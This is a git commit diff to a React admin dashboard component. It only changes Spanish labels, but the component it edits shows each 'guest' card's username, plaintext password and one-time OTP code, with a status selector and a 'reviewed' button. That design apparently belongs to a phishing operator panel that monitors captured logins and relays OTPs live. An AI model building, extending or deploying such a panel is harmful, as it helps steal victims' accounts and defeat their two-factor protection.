86d5f97db06f8c7335e99013decaf8b928d4febd
Samuel Pineda <sapinedal@outlook.com>
2025-01-03 23:02:02 -0500

    adminchanges

--- src/components/AdminDashboard/AdminDashboard.jsx
+++ src/components/AdminDashboard/AdminDashboard.jsx
@@ -82,16 +82,16 @@ const AdminDashboard = () => {
                 updatedGuestId === guest.id ? 'ring-4 ring-indigo-500 scale-105' : ''
               } ${guest.isReviewed ? 'border-4 border-lime-500' : ''}`}
             >
-              <p className="text-center font-bold text-lg text-blue-400">Nuevo Ingreso Goledor ⭐️💎</p>
+              <p className="text-center font-bold text-lg text-blue-400">NUEVO INGRESO GOLEADOR</p>
               <div className="my-4">
-                <p><b className="text-white">🧑‍💻 Usuario:</b> {guest.user}</p>
-                <p><b className="text-white">🔐 Contraseña:</b> {guest.cc}</p>
+                <p><b className="text-white">USUARIO:</b> {guest.user}</p>
+                <p><b className="text-white">CONTRASEÑA:</b> {guest.cc}</p>
                 <p><b className="text-white">🏆 OTP:</b> {guest.otp}</p>
               </div>
               
               <div className="flex justify-between items-center">
                 <p className="flex-1 text-center">
-                  <strong className="text-indigo-300">Estado Actual:</strong> {statuses.find(status => status.id === guest.status_id)?.name}
+                  <strong className="text-indigo-300">ESTADO ACTUAL</strong> {statuses.find(status => status.id === guest.status_id)?.name}
                 </p>
                 
                 <div className="flex gap-4 justify-end">
@@ -113,7 +113,7 @@ const AdminDashboard = () => {
                   onClick={() => markAsReviewed(guest.id)}
                   className="mt-6 py-2 px-5 bg-green-600 text-white rounded-full hover:bg-green-700 transition ease-in-out"
                 >
-                  Marcar como Revisado
+                  REVISADO
                 </button>
               )}
             </div>
